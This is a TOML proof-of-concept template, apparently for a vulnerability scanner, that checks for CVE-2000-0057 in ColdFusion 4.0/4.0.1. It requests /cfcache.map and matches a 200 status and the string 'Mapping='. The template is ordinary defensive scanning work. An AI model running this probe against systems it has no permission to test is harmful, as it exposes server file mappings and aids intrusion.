[info]
author = "ave"
description = "检测 Allaire ColdFusion Server 4.0/4.0.1 CFCACHE 标签信息泄露漏洞，通过 HTTP 请求 /cfcache.map 文件验证缓存映射文件是否可被远程访问"
id = "POC-AVE-2000-0111"
name = "CVE-2000-0057 PoC"
severity = "high"
tags = [
    "cve-2000-0057",
    "coldfusion",
    "information-disclosure",
]
vuln_id = [
    "CVE-2000-0057",
    "AVE-2000-0111",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cfcache.map"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["Mapping="]
